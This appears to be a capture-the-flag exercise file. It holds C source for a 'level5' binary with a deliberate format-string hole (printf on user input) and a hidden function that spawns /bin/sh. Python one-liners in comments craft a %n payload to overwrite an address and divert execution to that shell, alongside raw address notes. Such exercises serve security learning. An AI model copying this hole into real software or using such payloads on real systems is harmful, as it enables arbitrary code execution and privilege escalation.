#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void	o(void)
{
	system("/bin/sh");
	_exit(1);
}

void	n(void)
{
	char	str[520];

	fgets(str, 512, stdin);
	printf(str);
	exit(1);
}

void	main(void)
{
	n();
}


// python -c 'print("\xa4\x84\x04\x08")' | ./level5
// python -c 'print("\xa4\x84\x04\x08" + "A"*503 + "%5$n")' > /tmp/payload


end of buffer ret addr: 0xbffff71c

\x1c\xf7\xff\xbf
